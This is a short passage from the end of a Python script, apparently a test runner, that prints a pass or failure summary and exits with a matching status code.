print(f"\n{'all passed' if not fails else f'{fails} failed'}")
sys.exit(1 if fails else 0)
